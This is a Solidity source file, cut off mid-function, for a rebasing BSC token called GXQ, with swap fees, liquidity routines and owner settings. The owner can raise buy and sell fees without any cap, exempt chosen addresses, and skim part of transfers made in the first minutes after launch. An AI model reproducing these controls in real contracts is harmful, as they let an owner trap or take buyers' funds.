// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;
/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly
                /// @solidity memory-safe-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint256);
}



interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}


interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}
// 根据排名发放额外奖励
interface RewardContract {
    function getReward(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}


contract GXQ is Ownable, IERC20Metadata {

    using SafeMath for uint256;
    address public constant DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public constant MAX_UINT256 = type(uint256).max;
    //uint256 private constant MAX_SUPPLY = 7 * 1e19 * 1e18;
    uint256 private constant MAX_SUPPLY = MAX_UINT256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name = "GXQ";
    string private _symbol = "GXQ";

    uint256 private _decimals = 18;

    address public uniswapV2RouterAddress;
    IUniswapV2Router02 public uniswapV2Router;
    //address public uniswapV2PairBNB;
    address public uniswapV2PairUSDT;
    address public usdt;
    address private _anyERC20Token;

    uint256 private buyFundRate = 300;
    uint256 private buyMarketingRate = 0;
    uint256 private buyLpRate = 150;
    uint256 private buyBurnRate = 0;
    uint256 private sellFundRate = 400;
    uint256 private sellMarketingRate = 100;
    uint256 private sellLpRate = 200;
    uint256 private sellBurnRate = 0;
    uint256 private dynRangeRate = 800;
    uint256 private dynPerLevelRate = 200;

    address private fundAddress;
    address private marketingAddress;

    mapping(address => bool) private excluded;
    mapping(address => bool) public _swapPairList;
    address public rewardFund;
    address rewardFactory;
    TokenDistributor public _tokenDistributor;

    uint256 private startTime = 1680779940;
    uint256 private holdAddrCounter;

    uint256 private TOTAL_GONS;
    uint256 public _lastRebasedTime;
    uint256 private _gonsPerFragment;
    uint256 public usdtPairBalance;
    //uint256 public bnbPairBalance;
    //uint256 public rebaseRate = 30800;
    uint256 public rebaseRate = 20700; 
    //uint256 public rebaseRate = 13500;   
    uint256 private _maxDeals = 10000 * 10 ** _decimals;
    //uint256 private _maxHold = 20000 * 10 ** _decimals;
    uint256 private _maxHold = MAX_UINT256;
    uint256 private numTokensSellToAddToLiquidity = 2000 * 10 ** _decimals;
    //uint256 private maxHoldAddrExcludeFee = 300000;
    uint256 private maxHoldAddrExcludeFee = MAX_UINT256;

    bool lock;
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public innerSwapAndLiquifyEnabled = true;
    bool public liquifyEnabled = false;
    bool public dynRangeRateEnabled = false;
    bool public staRangeRateEnabled = false;
    bool public batchKillBlockEnabled = false;

    modifier swapLock() {
        require(!lock, "CDBLMProtocol: swap locked");
        lock = true;
        _;
        lock = false;
    }

    modifier lockTheSwap {
        require(!inSwapAndLiquify, "CDBLMProtocol: inSwapAndLiquify locked");
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    event LogRebase(uint256 indexed epoch, uint256 totalSupply);
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event InnerSwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndERC20Liquify(
        uint256 tokensSwapped,
        uint256 erc20Received,
        uint256 tokensIntoLiqudity
    );
    event SetSwapPairList(address indexed addr, bool indexed enable);

    constructor() {
        // require(_usdt != address(0), "CDBLMProtocol: usdt address is zero");
        // require(_fundAddress != address(0), "CDBLMProtocol: fund address is zero");
        // require(_marketingAddress != address(0), "CDBLMProtocol: marketing address is zero");
        // require(_uniswapV2RouterAddress != address(0), "CDBLMProtocol: router address is zero");

        _totalSupply = 50000000 * 10 ** _decimals;
        TOTAL_GONS = MAX_UINT256 / 1e10 - (MAX_UINT256 / 1e10 % _totalSupply);
        _balances[tx.origin] = TOTAL_GONS;
        _gonsPerFragment = TOTAL_GONS / _totalSupply;

        usdt = 0x55d398326f99059fF775485246999027B3197955;
        _anyERC20Token = 0x55d398326f99059fF775485246999027B3197955;
        fundAddress = 0x69f154134D6681138264121d8351F1a7Be0E2751;
        marketingAddress = 0x683a0095E83bca3351D9Fa2281030d9d0798bbC2;
        uniswapV2RouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

        uniswapV2Router = IUniswapV2Router02(uniswapV2RouterAddress);
        //uniswapV2PairBNB = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2PairUSDT = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(address(this), usdt);

        //_swapPairList[uniswapV2PairBNB] = true;
        _swapPairList[uniswapV2PairUSDT] = true;

        IERC20(_anyERC20Token).approve(address(uniswapV2Router), MAX_UINT256);
        rewardFund = tx.origin;
        excluded[tx.origin] = true;
        excluded[address(this)] = true;
        excluded[uniswapV2RouterAddress] = true;
        excluded[fundAddress] = true;
        excluded[marketingAddress] = true;

        _tokenDistributor = new TokenDistributor(_anyERC20Token);

        emit Transfer(address(0), tx.origin, _totalSupply);
    }
    
    receive() external payable {}

    function setStartTime(uint256 _startTime) public onlyOwner {
        startTime = _startTime;
        if (_lastRebasedTime == 0) {
            _lastRebasedTime = _startTime;
        }
    }

    function setExcluded(address _addr, bool _state) public onlyOwner {
        excluded[_addr] = _state;
    }

    function setFundAddress(address _fundAddress) public onlyOwner {
        fundAddress = _fundAddress;
    }

    function setMarketingAddress(address _marketingAddress) public onlyOwner {
        marketingAddress = _marketingAddress;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setInnerSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        innerSwapAndLiquifyEnabled = _enabled;
        emit InnerSwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setLiquifyEnabled(bool _enabled) public onlyOwner {
        liquifyEnabled = _enabled;
    }

    function setDynRangeRateEnabled(bool _enabled) public onlyOwner {
        dynRangeRateEnabled = _enabled;
    }

    function setStaRangeRateEnabled(bool _enabled) public onlyOwner {
        staRangeRateEnabled = _enabled;
    }

    function setBatchKillBlockEnabled(bool _enabled) public onlyOwner {
        batchKillBlockEnabled = _enabled;
    }

     function setSwapPairList(address addr, bool enable) external onlyOwner {
        //require(addr != uniswapV2PairBNB, "CDBLMProtocol: The bnbPair cannot be removed from swapPairList");
        require(addr != uniswapV2PairUSDT, "CDBLMProtocol: The usdtPair cannot be removed from swapPairList");
        _setSwapPairList(addr, enable);
    }

    function _setSwapPairList(address addr, bool enable) private {
        require(_swapPairList[addr] != enable, "CDBLMProtocol: swapPairList is already set to that enable");
        _swapPairList[addr] = enable;
        emit SetSwapPairList(addr, enable);
    }

    function setNumTokensSellToAddToLiquidity(uint256 amount) external onlyOwner {
        numTokensSellToAddToLiquidity = amount;
    }

    function setMaxDeals(uint256 maxDeals) external onlyOwner {
        _maxDeals = maxDeals;
    }

    function setMaxHold(uint256 maxHold) external onlyOwner {
        _maxHold = maxHold;
    }

    function setMaxHoldAddrExcludeFee(uint256 amount) external onlyOwner {
        maxHoldAddrExcludeFee = amount;
    }

    function setBuyFundFee(uint256 _fundFee) external onlyOwner {
        buyFundRate = _fundFee;
    }

    function setBuyMarketingFee(uint256 _marketingFee) external onlyOwner {
        buyMarketingRate = _marketingFee;
    }

    function setSellFundFee(uint256 _fundFee) external onlyOwner {
        sellFundRate = _fundFee;
    }

    function setSellMarketingFee(uint256 _marketingFee) external onlyOwner {
        sellMarketingRate = _marketingFee;
    }

    function setBuyLpFee(uint256 _lpFee) external onlyOwner {
        buyLpRate = _lpFee;
    }

    function setSellLpFee(uint256 _lpFee) external onlyOwner {
        sellLpRate = _lpFee;
    }

    function setBuyBurnFee(uint256 _burnFee) external onlyOwner {
        buyBurnRate = _burnFee;
    }

    function setSellBurnFee(uint256 _burnFee) external onlyOwner {
        sellBurnRate = _burnFee;
    }

    function isContract(address account) internal view returns (bool) {
        uint256 addressFlag;
        assembly {
            addressFlag := extcodesize(account)
        }
        return addressFlag > 0;
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public view override returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (account == uniswapV2PairUSDT){
            return usdtPairBalance;
        } else {
            return _balances[account] / _gonsPerFragment;
        }
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "CDBLMProtocol: decreased allowance below zero");

        _approve(owner, spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {

        bool takeFee;
        bool isSell;

        require(from != address(0), "CDBLMProtocol: transfer from the zero address");
        require(to != address(0), "CDBLMProtocol: transfer to the zero address");
        _rewardAction(from, to, amount);
        _tradeControl(from, to, amount);

        uint256 fromBalance;
        if (from == uniswapV2PairUSDT) {
            fromBalance = usdtPairBalance;
        } else {
            fromBalance = _balances[from] / _gonsPerFragment;
        }

        require(fromBalance >= amount, "CDBLMProtocol: transfer amount exceeds balance");

        bool shouldAddHolder = balanceOf(to) == 0 && !isContract(to);

        if (!excluded[from] && !excluded[to]) {
            uint256 maxSellAmount = fromBalance.mul(9999).div(10000);
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
            if(
                startTime + 5 minutes > block.timestamp &&
                startTime <= block.timestamp &&
                batchKillBlockEnabled
            ) {
                _batchKillBlock(from, to, amount);
                return;
            }
        }

        _rebase(from);

        if (_swapPairList[from] || _swapPairList[to]) {
            if (
                !excluded[from] && 
                !excluded[to] &&
                holdAddrCounter <= maxHoldAddrExcludeFee
            ) {
                uint256 swapFee = buyFundRate.add(buyLpRate).add(buyMarketingRate).add(sellFundRate).add(sellLpRate).add(sellMarketingRate);
                uint256 contractTokenBalance = balanceOf(address(this));
                bool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;
                if (
                    overMinTokenBalance &&
                    !inSwapAndLiquify &&
                    _swapPairList[to] &&
                    swapAndLiquifyEnabled
                ) {
                    contractTokenBalance = numTokensSellToAddToLiquidity;
                    swapAndERC20Liquify(contractTokenBalance, swapFee);
                }

                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        } else {
            if (
                !excluded[from] && 
                !excluded[to] && 
                holdAddrCounter <= maxHoldAddrExcludeFee
            ) {
                takeFee = true;
            }
            isSell = true;
        }

        uint256 finalAmount = _fee(from, to, amount, takeFee, isSell);

        _basicTransfer(from, to, finalAmount);

        if(shouldAddHolder) {
            holdAddrCounter++;
        }
    }

    function _batchKillBlock(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 batchKillBlockRateReal;
        uint256 batchKillBlockAmount;
        batchKillBlockRateReal = _batchKillBlockRateReal();
        batchKillBlockAmount = amount.mul(batchKillBlockRateReal).div(10000);
        if (batchKillBlockAmount > 0) {
            _basicTransfer(from, address(this), batchKillBlockAmount);
        }
        _basicTransfer(from, to, amount.sub(batchKillBlockAmount));
    }

    function _basicTransfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 gonAmount = amount * _gonsPerFragment;
        if (from == uniswapV2PairUSDT){
            usdtPairBalance = usdtPairBalance - amount;
        } else {
            _balances[from] = _balances[from] - gonAmount;
        }

        if (to == uniswapV2PairUSDT){
            usdtPairBalance = usdtPairBalance + amount;
        } else {
            _balances[to] = _balances[to] + gonAmount;
        }

        emit Transfer(from, to, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "CDBLMProtocol: approve from the zero address");
        require(spender != address(0), "CDBLMProtocol: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "CDBLMProtocol: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function _rebase(address from) private swapLock {
        if (
            _totalSupply < MAX_SUPPLY &&
            from != uniswapV2PairUSDT  &&
            _lastRebasedTime > 0 &&
            block.timestamp >= (_lastRebasedTime + 15 minutes) &&
            block.timestamp < (startTime + 1440 days)
        ) {
            uint256 deltaTime = block.timestamp - _lastRebasedTime;
            uint256 times = deltaTime / (15 minutes);
            uint256 epoch = times * 15;

            for (uint256 i = 0; i < times; i++) {
                _totalSupply = _totalSupply
                * (10 ** 8 + rebaseRate)
